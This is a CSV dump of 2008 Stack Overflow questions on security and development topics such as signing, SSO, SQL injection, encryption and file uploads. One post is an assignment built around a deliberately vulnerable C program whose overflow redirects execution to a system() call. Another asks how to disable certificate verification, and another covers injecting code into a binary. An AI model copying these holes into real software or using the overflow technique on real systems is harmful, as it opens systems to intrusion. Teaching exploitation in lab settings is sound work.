Id,PostTypeId,AcceptedAnswerId,ParentId,CreationDate,DeletionDate,Score,ViewCount,Body,OwnerUserId,OwnerDisplayName,LastEditorUserId,LastEditorDisplayName,LastEditDate,LastActivityDate,Title,Tags,AnswerCount,CommentCount,FavoriteCount,ClosedDate,CommunityOwnedDate
"378247","1","379033","","2008-12-18 15:46:06","","53","70513","<p>I have a digital certificate that identifies an user. I need to use it to Digitally sign pdf files.</p>

<p>Does anyone have an example that does not uses a third party component? I need to get this done but it would be nice to fully understand how things are done.</p>

<p>C# Examples please :)</p>
","32037","Sergio","170339","Sergio","2012-07-15 15:49:40","2012-07-18 08:16:22","Digitally sign PDF files","<c#><pdf><digital-signature>","4","6","25","2013-04-30 21:04:19",""
"371921","1","372012","","2008-12-16 16:56:43","","56","7650","<p>This is a perennial question for me that I've never really resolved so I'd like your input.  If I have actions that I know a user will not be able to perform due to insufficient privileges or object state, should the UI elements for those actions be hidden from the user, visible but disabled, or visible and result in an error if attempted? What would be the rationale for your answer? If disabled, would you communicate the reason why and, if so, how?</p>

<p>This is a web interface so I already know that I need to check the incoming post/get for permissions and handle errors there anyway.  I'm primarily talking about how to handle the UI.</p>

<p>This is similar to <a href=""https://stackoverflow.com/questions/79033/rules-about-disabling-or-hiding-menu-items"">Rules about disabling or hiding menu items</a>, though I am interested in all types of UI elements not just menus.</p>

<p>Examples:</p>

<ol>
<li><p>I have a New page that allows a user to create a new Event.  Events can be master events or subevents.  Creating a master event requires ""EditMasterEvent"" privilege, while creating a subevent requires only ""EditEvent"" privilege.  I have a drop down that allows one to choose an existing event as the parent (master event) or no parent (this is a master event).  Should the ""Create Master Event"" choice be shown on the dropdown or omitted if the user only has ""EditEvent"" privileges.</p></li>
<li><p>Deleting events requires that you be an application administrator or have the appropriate edit permission for the event type.  In the latter case, the event must also be more than 5 years old.  Deleting an event causes major cascading deletes of related data in the system and for legal reasons this data must be kept for at least 5 years after the event.  Since this operation is rare for the normal user, the typical case is that the action is not available.  Should it be shown always or only when actually possible?</p></li>
</ol>
","12950","tvanfosson","-1","tvanfosson","2017-05-23 12:10:32","2017-08-22 09:42:23","Should unauthorized actions in the UI be hidden, disabled, or result in an error?","<user-interface><authorization>","13","0","10","2018-11-30 09:54:29",""
"363276","1","","","2008-12-12 16:29:41","","14","39457","<p>How can I hide the div without using <code>display:none</code> or JavaScript?</p>

<p>In my country, a lot of Blackberrys come with the CSS support disabled (the mobile companies here are not so good to developers). I have text that says</p>

<pre><code>&lt;div class=""BBwarn""&gt;
please activate your css support and a link
&lt;/div&gt;
</code></pre>

<p>I want to hide that once the user activates CSS support, but i can't use <code>display:none;</code> because it is only supported in BB firmware 4.6. It is a public site and I can't make all my visitors upgrade.</p>

<p>Does anybody knows a solution to this? I hope the question is easier to understand now.</p>

<p>Update:
Thank you all for the answers but I can't use </p>

<ul>
<li>position:absolute</li>
<li>overflow</li>
</ul>

<p>because they are available from Blackberry firmware 4.6 and up</p>
","45759","rblanch","45759","rblanch","2008-12-15 18:23:34","2019-09-03 19:08:53","Hide something with CSS without display:none or JavaScript","<html><css><blackberry><mobile>","19","2","3","",""
"353880","1","353892","","2008-12-09 19:16:31","","97","41126","<p>I am a little curious to know about how OpenID authentication works.</p>

<p>Is there any difference between OpenID authentication and the authentication which sites use exclusively for themselves?</p>
","41968","Biswanath","1685157","ffpf","2017-08-09 13:55:07","2017-08-09 13:55:07","How does OpenID authentication work?","<authentication><openid>","4","7","40","",""
"351873","1","352263","","2008-12-09 05:19:18","","5","2536","<p>I am running two different sites on two different servers with two different domains. One site is running Joomla, the other Moodle. I have configured the Moodle server to base its authentication on the users table on the Joomla site, so we have an authoritative source of user information.</p>

<p>What I'd like to do is this: after someone signs in to the Joomla site, provide a link to the Moodle site which will silently log them in, kind of faking a single-sign-on solution. The passwords in Joomla are MD5'd and each has its own secret salt.</p>

<p>The first thought at how to tackle this was to tell Moodle that the passwords were being stored in plain text, then via a hidden form input, send the encrypted password when they click the link. Aside from the obvious security issues with that, it also meant that should they try to log in via the Moodle interface, they'd need to enter a giant MD5 string, since that's what Moodle thinks their password is.</p>

<p>I've been considering changing the authentication module in Moodle so that if the submitted password matches certain criteria (eg: it's 32 hex characters), then don't MD5 it before comparing to the Joomla version - the problem with that is that anyone could (upon discovering the encrypted password) then use that to log in. What I need is some special way to send the encrypted password from Joomla to Moodle and to signal to Moodle to treat that login request differently.</p>

<p>Any thoughts?</p>
","9021","nickf","90723","","2009-09-20 01:00:40","2009-09-20 01:00:40","Passing credentials between sites","<security><joomla><passwords><single-sign-on><moodle>","3","0","","",""
"342378","1","","","2008-12-04 22:53:19","","48","34509","<p>We offer a number of online services. We are required to develop a system which provides a quick/simple experience for users if they are transferred from one service (on <code>domain1.com</code>) to another service (on <code>domain2.com</code>).</p>

<p>Is there a safe and secure way to log a user in automatically once he has been transferred to the new service?</p>

<p>Yell at me if the solution below is completely insecure/wrong.</p>

<p>We were considering a system similar to that provided by a number of online services for password recovery - they are emailed a link with a unique hash which expires, that allows them to change their password.</p>

<p>The <code>domain1.com</code> site would generate a unique hash and store it in a database with the hash linked to a user along with an expire datetime field.</p>

<p>The user will be transferred to <code>domain2.com/auto/?hash=d41d8cd98f00b204e9800998ecf8427e</code></p>

<p><code>domain2.com</code> would next make a request to <code>domain1.com</code> with the hash to get the information about the user. <code>domain1.com</code> would then remove the hash from the database. <code>domain2.com</code> would log the user in and set cookies, etc.</p>

<p>Could something based on OpenID or OAuth achieve the same results?</p>
","35293","smashedmercury","964243","Sam Hasler","2019-07-16 20:25:01","2019-07-16 20:25:01","Cross Domain Login - How to log a user in automatically when transferred from one domain to another","<security><authentication><dns><single-sign-on>","5","0","71","",""
"339244","1","339315","","2008-12-04 00:31:21","","3","5651","<p>I have a domain and a group of sub-domains that require authentication to access. I am currently using mod_auth to authenticate users (mod_auth basic) at the domain.tld level. My goal is for single sign-on between the domain and all the sub-domains.</p>

<p>Will these credentials carry on to the sub-domains automatically, or with a simple vhost config change, or is there a better method to do this?</p>
","","user43040","","user3850","2008-12-04 01:06:35","2009-03-24 15:54:02","Using Apache's mod_auth across multiple sub-domains for single sign-on?","<apache><authentication><single-sign-on><mod-auth>","1","0","1","",""
"338385","1","479914","","2008-12-03 19:09:31","","24","42451","<p>Trying to make a <a href=""http://en.wikipedia.org/wiki/Web_service"" rel=""noreferrer"">web service</a> call to an <a href=""http://en.wikipedia.org/wiki/HTTP_Secure"" rel=""noreferrer"">HTTPS</a> endpoint in my <a href=""http://en.wikipedia.org/wiki/Microsoft_Silverlight"" rel=""noreferrer"">Silverlight</a> application results in this error: ""Could not find a base address that matches scheme https for the endpoint with binding WSHttpBinding. Registered base address schemes are [http]""</p>

<p>The same problem as was posted here:</p>

<p><a href=""http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/4c19271a-f5e6-4659-9e06-b556dbdcaf82/"" rel=""noreferrer"">http://social.msdn.microsoft.com/Forums/en-US/wcf/thread/4c19271a-f5e6-4659-9e06-b556dbdcaf82/</a></p>

<p>So, one of the suggestions was this: ""The other issue might be that the cert name and the machine name don't agree, and this is causing <a href=""http://en.wikipedia.org/wiki/Windows_Communication_Foundation"" rel=""noreferrer"">WCF</a> to have fits. If this is the case, you can tell WCF to skip verification of the cert.""</p>

<p>Well, I <strong>do</strong> get a certificate error because this is just a demo server.</p>

<p>Here's how I set up my client:</p>

<pre><code>BasicHttpBinding binding = new BasicHttpBinding();
binding.Security.Mode = BasicHttpSecurityMode.Transport;
_ws = new AnnotationService.AnnotationClient(binding, new EndpointAddress(myAddress));
</code></pre>

<p>How can I tell WCF to skip the verification?</p>
","28643","Mike Blandford","63550","","2009-11-09 15:14:48","2011-01-31 22:26:58","How do I tell WCF to skip verification of the certificate?","<wcf><silverlight><http><https><certificate>","2","0","12","",""
"329658","1","717312","","2008-12-01 00:10:47","","31","47994","<p>How do I achieve authorization with MVC asp.net?</p>
","29445","Shahin","29445","Dan","2010-07-16 09:14:02","2014-05-18 22:07:46","ASP.NET MVC Authorization","<c#><asp.net-mvc><authorization>","4","1","14","",""
"329500","1","329562","","2008-11-30 22:22:56","","17","15099","<p>I would like to use <code>[Authorize]</code> for every action in my admin controller except the <code>Login</code> action. </p>

<pre><code>[Authorize (Roles = ""Administrator"")]
public class AdminController : Controller
{
    // what can I place here to disable authorize?
    public ActionResult Login()
    {
        return View();
    }
}
</code></pre>
","31624","Todd Smith","1193333","","2013-02-08 09:35:41","2013-05-09 07:11:02","Can you enable [Authorize] for controller but disable it for a single action?","<c#><asp.net-mvc><authorization>","4","0","10","",""
"329396","1","329499","","2008-11-30 21:32:36","","48","54453","<p>I am considering purchasing a code signing certificate from VeriSign or Thawte to sign an XBAP with. My question is this: What happens when that certificate expires? $299 and $599 are pretty hefty prices for 1-year/2-year cerificates, and if I have to deliver a newly signed build to my customers whenever my certificate expires, then I'll just deal with the hassle of creating my own certificate for now.</p>

<p>What I don't like about creating my own certificate is the difficulty in distributing it to all of the client machines that will be using my XBAP. My application will only ever be used on a LAN, so I suppose I could always use Windows Installer to install my home brewed certificate (although I'm unsure on how to do this - anyone have any ideas?).</p>

<p>This wouldn't really be a problem if I was delivering a partial trust application - but my application needs Web permissions, since it will be talking to WCF services, so it is in that grey area between partial trust and full trust, and without a certificate, I get that fun ole Trust Not Granted message when I try to load my XBAP.</p>

<p>Any ideas?</p>
","18505","unforgiven3","","","","2017-03-11 22:07:42","What happens when a code signing certificate expires?","<certificate><code-signing><xbap>","6","8","20","",""
"311243","1","312001","","2008-11-22 11:45:24","","6","5699","<p>I have a Java application and I would like to make it extensible.  To create an extension, developers within our company will write a Java class that implements a certain interface.  They may also wish to write associated helper classes.  I would like to load these extensions into the application without an outage.</p>

<p>I would like to limit what this class can do to the following:</p>

<ol>
<li>Call methods in the application's API (this will be a parameter to the constructor)</li>
<li>Create instances of other objects within the same package (so the author of the extension class can use other classes to get the job done).</li>
</ol>

<p>When the class is invoked the API object that is passed in will already have a ""customer"" defined and stored as a member variable.  It will use this to limit access via the API to that customer's data.</p>

<p>I do not want these classes doing things such as accessing the database, writing to disk, or otherwise doing things etc.  This is mostly an effort at dependency management and encapsulation as the same team of developers will have access to write both extensions and the core system.</p>

<p>Is there a pattern for this?   Am I on the right track?</p>
","14663","WW","3474","erickson","2008-11-23 16:43:19","2008-11-23 16:43:19","How to grant different permissions to various Java classes?","<java><security><classpath><sandbox>","2","0","5","",""
"310714","1","310740","","2008-11-22 01:49:57","","47","94908","<p>On the PHP website, the only real checking they suggest is using <code>is_uploaded_file()</code> or <code>move_uploaded_file()</code>, <a href=""http://ca.php.net/manual/en/features.file-upload.php"" rel=""noreferrer"">here</a>. Of course you usually don't want user's uploading any type of file, for a variety of reasons.</p>

<p>Because of this, I have often used some ""strict"" mime type checking. Of course this is very flawed because often mime types are wrong and users can't upload their file. It is also very easy to fake and/or change. And along with all of that, each browser and OS deals with them differently.</p>

<p>Another method is to check the extension, which of course is even easier to change than mime type.</p>

<p>If you only want images, using something like <code>getimagesize()</code> will work.</p>

<p>What about other types of files? PDFs, Word documents or Excel files? Or even text only files?</p>

<p><strong>Edit:</strong> If you don't have <a href=""http://php.net/manual/en/function.mime-content-type.php"" rel=""noreferrer"">mime_content_type</a> or <a href=""http://php.net/manual/en/function.finfo-file.php"" rel=""noreferrer"">Fileinfo</a> and system(""file -bi $uploadedfile"") gives you the wrong file type, what other options are there?</p>
","5441","Darryl Hein","89771","Darryl Hein","2011-05-14 05:36:13","2019-08-10 06:16:47","How to check file types of uploaded files in PHP?","<php><validation><file-upload><mime-types>","7","1","19","",""
"306668","1","306675","","2008-11-20 20:06:43","","81","26435","<p>I've been preaching both to my colleagues and here on SO about the goodness of using parameters in SQL queries, especially in .NET applications. I've even gone so far as to promise them as giving immunity against SQL injection attacks.</p>

<p>But I'm starting to wonder if this really is true. Are there any known SQL injection attacks that will be successfull against a parameterized query? Can you for example send a string that causes a buffer overflow on the server?</p>

<p>There are of course other considerations to make to ensure that a web application is safe (like sanitizing user input and all that stuff) but now I am thinking of SQL injections. I'm especially interested in attacks against MsSQL 2005 and 2008 since they are my primary databases, but all databases are interesting. </p>

<p>Edit: To clarify what I mean by parameters and parameterized queries. By using parameters I mean using ""variables"" instead of building the sql query in a string.<br>
So instead of doing this: </p>

<pre><code>SELECT * FROM Table WHERE Name = 'a name'
</code></pre>

<p>We do this:</p>

<pre><code>SELECT * FROM Table WHERE Name = @Name
</code></pre>

<p>and then set the value of the @Name parameter on the query / command object.</p>
","30366","Rune","21632","coldice","2009-09-18 17:40:01","2011-04-12 14:47:07","Are Parameters really enough to prevent Sql injections?","<asp.net><sql><database><sql-injection>","9","3","31","",""
"302497","1","302526","","2008-11-19 16:32:08","","6","2103","<p>One of the biggest issues I have, from a UI standpoint, when building a new website is figuring out what colors I will use and of those colors, do they actually work well together. 
<br /><br />
I found this site that has really helped me out and I figured I would share it with all of you and also get some responses back about either sites similar or other ways that you get/figure out your color schemes.
<br /><br />
Here is the site that I currently use: <a href=""http://kuler.adobe.com/"" rel=""nofollow noreferrer""><a href=""http://kuler.adobe.com/"" rel=""nofollow noreferrer"">http://kuler.adobe.com/</a></a>
<br /><br />
With Adobe Kuler, you can chose a base color and it will suggest 5 colors, including your color, that go well with one another. You can, of course, modify the colors it chooses. Also,one of the main features I use, is the image color matching. You can upload an image and it will determine a color scheme based on the colors of the image. So if you have a logo and want to use the colors of the logo, then this works perfectly for you.
<br /><br />
Thank you and I look forward to your feedback!</p>
","25597","Steve Hayes","","","","2017-05-05 14:45:55","Determining your websites color scheme","<user-interface><web><color-scheme><color-management>","6","0","7","",""
"295628","1","295652","","2008-11-17 14:03:32","","20","10951","<p>Our team is using a SecureRandom to generate a list of key pairs (the SecureRandom is passed to a KeyPairGenerator).  We cannot agree on which of the following two options to use:</p>

<ol>
<li><p>Create a new instance every time we need to generate a key pair</p></li>
<li><p>Initialize a static instance and use it for all key pairs</p></li>
</ol>

<p>Which approach is generally better and <em>why</em>?</p>

<p>ADDED: My gut feeling is that the second option is more secure.  But my only argument is a theoretical attack based on the assumption that the pseudorandomness is derived from the current timestamp: someone may see the creation time of the key pair, guess timestamps in the surrounding time interval, compute the possible pseudorandom sequences, and obtain the key material.</p>

<p>ADDED: My assumption about determinism based on a timestamp was wrong.  That's the difference between Random and SecureRandom.  So, it looks like the answer is: in terms of security it doesn't really matter.</p>
","23109","","23109","","2008-11-18 08:25:16","2018-02-25 12:11:03","SecureRandom: init once or every time it is needed?","<java><security><random><cryptography>","7","0","6","",""
"295345","1","297792","","2008-11-17 11:18:15","","2","5057","<p>I need to encrypt a small block of data (16 bytes) using 512 bit RSA public key -- quite an easy task for most cryptography libraries known to me, except for MS CSP API, as it seems.
Documentation for <a href=""http://msdn.microsoft.com/en-us/library/aa379924(VS.85).aspx"" rel=""nofollow noreferrer"">CryptEncrypt</a> function states that</p>

<blockquote>
  <p>The Microsoft Enhanced Cryptographic Provider supports direct encryption with RSA public keys and decryption with RSA private keys. The encryption uses PKCS #1 padding.</p>
</blockquote>

<p>It didn't work to me though. Well, my code works and produces encrypted block of data with correct size, but openssl fails to decypher it. It looks much like CryptEncrypt still uses symmetric cypher.</p>

<p>Unfortunately all the examples I've found refer to combined cryptography with symmetric cypher, so I don't have a working example on hands which definitely would make things easier.</p>

<p>Could please anyone point me to such an example or let me know if there are some not that obvious pitfalls I've missed?</p>

<p>Thank you.</p>
","2231145","Alexey Naidyonov","51425","","2009-12-19 12:19:56","2013-08-16 23:00:54","How to encrypt small data block with only RSA public key using Microsoft ECSP?","<cryptography><rsa><cryptoapi>","2","0","1","",""
"294688","1","308087","","2008-11-17 01:26:00","","17","4441","<p>I have a specific scenario in mind, but I will ask this generally:</p>

<p><strong>Is there a way to make my mobile phone trigger an action on my computer?</strong> I am thinking that with a smart phone it must be possible to link the phone and the personal computer with bluetooth, and have some sort of small program running on my computer that will listen for incoming phone calls on the phone. When someone calls me, I want my mobile to simply submit the callers phone number to the personal computer, and then the personal computer will do its stuff from there. Then, I want to handle the call on the mobile phone as usual.</p>

<p><strong>Edit</strong>:<br></p>

<p>Updated this question! I am currently using the HTC Hero, and hopefully the Android SDK will make this more easy to accomplish.</p>

<p><strong>My specific scenario was:</strong><br></p>

<p>When my phone (Nokia N82) calls, i want to submit the callers <code>phonenumber</code> to a search <em>applet/application</em>, that will query <em>Microsoft Dynamics CRM</em> and see if a contact person or a company has that <code>phonenumber</code>, and if so, show the corresponding person or companys info on my screen. My preferred development platform is .NET Framework.</p>
","29397","Bj&#248;rn","2638235","","2018-03-06 07:06:59","2018-03-06 07:06:59","How to make an incoming call on my mobile trigger an action on my pc","<.net><android><mobile><bluetooth><phone-call>","10","1","6","",""
"288612","1","288675","","2008-11-13 22:44:03","","225","340912","<p>I have a form that excepts a file upload in ASP.NET. I need to increase the max upload size to above the 4 MB default.</p>

<p>I have found in certain places referencing the below code at <a href=""http://msdn.microsoft.com/en-us/library/system.web.configuration.httpruntimesection.maxrequestlength.aspx"" rel=""noreferrer"">msdn</a>. </p>

<pre><code>[ConfigurationPropertyAttribute(""maxRequestLength"", DefaultValue = )]
</code></pre>

<p>None of the references actually describe how to use it, and I have tried several things with no success. I only want to modify this attribute for certain pages that are asking for file upload.</p>

<p>Is this the correct route to take? And how do I use this?</p>
","576","Eddie","76337","","2010-03-16 02:08:15","2019-02-15 21:17:51","How to increase the max upload file size in ASP.NET?","<c#><.net><asp.net><file-upload>","14","2","70","",""
"287789","1","288195","","2008-11-13 18:30:26","","9","9896","<p>I have a huge file that I must parse line by line. Speed is of the essence. </p>

<p>Example of a line:</p>

<blockquote>
<pre><code>Token-1   Here-is-the-Next-Token      Last-Token-on-Line
      ^                        ^
   Current                 Position
   Position              after GetToken
</code></pre>
</blockquote>

<p>GetToken is called, returning ""Here-is-the-Next-Token"" and sets the CurrentPosition to the position of the last character of the token so that it is ready for the next call to GetToken. Tokens are separated by one or more spaces.</p>

<p>Assume the file is already in a StringList in memory. It fits in memory easily, say 200 MB.</p>

<p>I am worried only about the execution time for the parsing. What code will produce the absolute fastest execution in Delphi (Pascal)?</p>
","30176","lkessler","30176","lkessler","2008-11-16 18:05:40","2008-11-16 18:05:40","What is the fastest way to Parse a line in Delphi?","<delphi><parsing><token><pascal>","9","0","14","","2008-11-16 18:05:40"
"286090","1","","","2008-11-13 02:31:25","","8","5796","<p>The question is actually about stack overflows in C. 
I have an assigment that I can not get done for the life of me, I've looked at everything in the gdb and I just cant figure it.</p>

<p>The question is the following:</p>

<pre><code>int i,n;

void confused()
{
    printf(""who called me"");
    exit(0);
}

void shell_call(char *c)
{
    printf("" ***Now calling \""%s\"" shell command *** \n"",c);
    system(c);
    exit(0);
}

void victim_func()
{
    int a[4];
    printf(""[8]:%x\n"", &amp;a[8]);
    printf(""Enter n: ""); scanf(""%d"",&amp;n);
    printf(""Enter %d HEX Values \n"",n);
    for(i=0;i&lt;n;i++) scanf(""%x"",&amp;a[i]);
    printf(""Done reading junk numbers\n"");
}

int main()
{
    printf(""ls=736c --- ps = 7370 --- cal = 6c6163\n"");
    printf(""location of confused %x \n"", confused);
    printf(""location of shell_call %x \n"", shell_call);
    victim_func();
    printf(""Done, thank you\n"");

}
</code></pre>

<p>Ok, so I managed to get the first question correctly, which is to arbitrarily call one of the two functions not explicitly called in the main path. By the way, this has to be done while running the program without any modifications.
I did this by running the program, setting <code>N</code> to <code>7</code>, which gets me to the Function Pointer of the <code>victim_func</code> frame, I write <code>a[7]</code> with the memory address of confused or <code>shell_call</code>, and it works. (I have a 64 bit machine, thats why I have to get it to 7, since the EBI pointer is 2 ints wide, instead of 1)</p>

<p>My question is the following, how could I control which argument gets passed to the <code>shell_code</code> funcion? ie. how do I write a <code>string</code> to <code>char* c</code>.
The whole point is executing unix commands like <strong>ps</strong> etc, by running only the program.</p>

<p>I figured writing the EBI pointer with the hex representation of <strong>ps</strong> and setting the arg list of <code>shell_call</code> to that, but that didn't work. I also tried inputing <code>argsv</code> arguments and setting the arg list of <code>shell_call</code> to the <code>arg_list</code> of main, but didn't work either. </p>

<p>I think the second version should work, but I believe I'm not setting the arg list of the new stack frame correctly ( I did it by writing <code>a[8]</code> to <code>0</code>, since its the first part of the function pointer, and writing <code>a[9]=736c</code> and <code>a[10]=0000</code>, but its probably not right since those are the parameters of <code>victim_func</code>. So how do I access the parameters of <code>shell_call</code>? </p>
","","Fernando Gonzalez","1244328","tvanfosson","2015-04-17 02:46:10","2015-04-17 02:46:10","Stack Overflow Exploit in C","<c><stack-overflow><buffer-overflow><exploit>","3","4","9","",""
"273452","1","","","2008-11-07 20:03:12","","118","331667","<p>I can't seem to find a nice clean example of using AES 128 bit encryption.</p>

<p>Does anyone have some sample code?</p>
","","YOYO","19020","contagious","2017-03-22 17:25:38","2017-03-22 17:25:38","Using AES encryption in C#","<c#><cryptography><aes><rijndaelmanaged>","10","1","70","",""
"273396","1","","","2008-11-07 19:46:25","","27","74719","<p>In AES encryption (.net framework), how are the public and private keys used?</p>

<p>Are the public and private keys combined to form a full key, and then the algorithm uses the public + private key to encrypt the data?</p>

<p>(simplified keys used below for example purposes)</p>

<p>e.g.
public key = 12345
private key = 67890</p>

<p>so the key used when generating the encryption result is: 1234567890</p>
","","YOYO","1450","John Topley","2008-11-07 19:47:53","2018-05-23 02:58:36","AES encryption, what are public and private keys?","<encryption><aes>","5","0","19","",""
"263518","1","263525","","2008-11-04 21:31:56","","11","99145","<p>Currently I have an application that receives an uploaded file from my web application. I now need to transfer that file to a file server which happens to be located on the same network (however this might not always be the case).</p>

<p>I was attempting to use the webclient class in C# .NET.</p>

<pre><code>    string filePath = ""C:\\test\\564.flv"";
    try
    {
        WebClient client = new WebClient();

        NetworkCredential nc = new NetworkCredential(uName, password);

        Uri addy = new Uri(""\\\\192.168.1.28\\Files\\test.flv"");
        client.Credentials = nc;
        byte[] arrReturn = client.UploadFile(addy, filePath);
        Console.WriteLine(arrReturn.ToString());
    }
    catch (Exception ex)
    {
        Console.WriteLine(ex.Message);
    }
</code></pre>

<p>The machine located at 192.168.1.28 is a file server and has a share c:\Files.
As of right now I am receiving an error of Login failed bad user name or password, but I can open explorer and type in that path login successfully. I can also login using remote desktop, so I know the user account works.</p>

<p>Any ideas on this error?
Is it possible to transfer a file directly like that? With the webclient class or maybe some other class?</p>
","21664","JustFoo","1677912","","2016-05-17 14:51:14","2016-05-17 14:51:14","Uploading files to file server using webclient class","<c#><file-upload><webclient><fileserver>","3","3","7","",""
"262493","1","","","2008-11-04 16:58:51","","20","7733","<p>What would be the best way of inserting functionality into a binary application (3d party, closed source).</p>

<p>The target application is on OSX and seems to have been compiled using gcc 3+. I can see the listing of functions implemented in the binary and have debugged and isolated one particular function which I would like to remotely call.</p>

<p>Specifically, I would like to call this function - let's call it void <code>zoomByFactor(x,y)</code> - when I receive certain data from a complex HIDevice.</p>

<p>I can easily modify or inject instructions into the binary file itself (ie. the patching does not need to occur only in RAM).</p>

<p>What would you recommend as a way of ""nicely"" doing this?</p>

<p><strong>Edit:</strong></p>

<p>I do indeed need to entire application. So I can't ditch it and use a library. (For those who need an ethical explanation: this is a proprietary piece of CAD software whose company website hasn't been updated since 2006. I have paid for this product (quite a lot of money for what it is, really) and have project data which I can not easily migrate away from it. The product suits me just fine as it is, but I want to use a new HID which I recently got. I've examined the internals of the application, and I'm fairly confident that I can call the correct function with the relevant data and get it to work properly).</p>

<p>Here's what I've done so far, and it is quite gheto.</p>

<p>I've already modified parts of the application through this process:</p>

<pre>
xxd -g 0 binary > binary.hex
cat binary.hex | awk 'substitute work' > modified.hex
xxd -r modified.hex > newbinary
chmod 777 newbinary
</pre>

<p>I'm doing this kind of jumping through hoops because the binary is almost 100 megs large.</p>

<p>The jist of what I'm thinking is that I'd jmp somewhere in the main application loop, launch a thread, and return to the main function. </p>

<p>Now, the questions are: where can I insert the new code? do I need to modify symbol tables? alternatively, how could I make a dylib load automatically so that the only ""hacking"" I need to do is inserting a call to a normally loaded dylib into the main function?</p>
","","Moe","745","Moe","2009-10-11 15:45:09","2014-10-20 14:27:38","Best way to inject functionality into a binary","<macos><reverse-engineering><code-injection>","6","0","10","",""
"261638","1","261645","","2008-11-04 11:57:27","","594","256635","<p>I am developing a piece of software in Python that will be distributed to my employer's customers. My employer wants to limit the usage of the software with a time restricted license file.</p>

<p>If we distribute the .py files or even .pyc files it will be easy to (decompile and) remove the code that checks the license file.</p>

<p>Another aspect is that my employer does not want the code to be read by our customers, fearing that the code may be stolen or at least the ""novel ideas"".</p>

<p>Is there a good way to handle this problem? Preferably with an off-the-shelf solution.</p>

<p>The software will run on Linux systems (so I don't think py2exe will do the trick).</p>
","6759","Jordfr&#228;s","2174742","Jordfr&#228;s","2014-09-22 13:23:58","2019-06-29 15:00:11","How do I protect Python code?","<python><licensing><obfuscation><copy-protection>","27","2","352","",""
"256172","1","256279","","2008-11-01 22:00:30","","35","32235","<p>The company I work for has recently been hit with many header injection and file upload exploits on the sites we host and while we have fixed the problem with respect to header injection attacks, we have yet to get the upload exploits under control.</p>

<p>I'm trying to set up a plug-and-play-type series of upload scripts to use in-house that a designer can copy into their site's structure, modify a few variables, and have a ready-to-go upload form on their site. We're looking to limit our exposure as much as possible (we've already shut down fopen and shell commands).</p>

<p>I've searched the site for the last hour and found many different answers dealing with specific methods that rely on outside sources. What do you all think is the best script-only solution that is specific enough to use as a reliable method of protection? Also, I'd like to keep the language limited to PHP or pseudo-code if possible.</p>

<p><strong>Edit:</strong> I've found my answer (posted below) and, while it does make use of the shell command exec(), if you block script files from being uploaded (which this solution does very well), you won't run into any problems.</p>
","25375","Stephen","25375","Stephen","2008-11-14 15:59:26","2018-08-09 08:05:36","What is the most secure method for uploading a file?","<php><security><file-upload>","3","0","40","","2008-11-01 22:00:30"
"254251","1","254437","","2008-10-31 17:13:05","","17","30040","<p>I need an easy way to allow users to upload multiple files at once (ie I need to allow a user to upload a folder).  I do not wish to put the burden of zipping on the user.  </p>

<p><em>I would prefer to avoid Flash or variants if possible.</em>  I'm looking for a straight javascript / HTML solution if it is possible.  Please note, this rules out the answers at: <a href=""https://stackoverflow.com/questions/159600/multiple-file-upload"">What is the best client side browser library to upload multiple files over http?</a>.</p>
","13990","torial","-1","","2017-05-23 10:30:01","2015-07-26 20:24:51","What is the best way to upload a folder to a website?","<javascript><html><file-upload>","7","2","4","",""
"252226","1","","","2008-10-31 00:17:14","","150","155162","<p>I have an <a href=""http://en.wikipedia.org/wiki/EXE"" rel=""noreferrer"">EXE</a> file that I should like to sign so that Windows will not warn the end user about an application from an ""unknown publisher"". I am not a Windows developer. The application in question is a screensaver generated from an application that generates screensaver applications. As such I have no influence on how the file is generated.</p>

<p>I've already found out that I will need a <a href=""https://en.wikipedia.org/wiki/Code_signing#Trusted-Library_Attribute"" rel=""noreferrer"">code signing</a> certificate from a <a href=""https://en.wikipedia.org/wiki/Certificate_authority"" rel=""noreferrer"">CA</a> like <a href=""https://en.wikipedia.org/wiki/Verisign"" rel=""noreferrer"">Verisign</a> or instantssl.com. What I don't understand is what I need to do (if at all possible) to sign my EXE file. What is a simple explanation?</p>

<p>Mel Green's answer took me further, but signtool wants me to specify what certificate to use in any case. Can I get a free code signing certificate somehow to test if this will work for me at all?</p>

<p>Also please specify which certificate kind is the correct one. Most sites only mention ""code signing"" and talk about signing applications that are actually compiled by the user. This is not the case for me.</p>
","9438","_Lasar","476","_Lasar","2017-01-26 14:42:11","2019-05-03 14:20:14","Signing a Windows EXE file","<windows><certificate><exe><sign>","8","3","89","",""
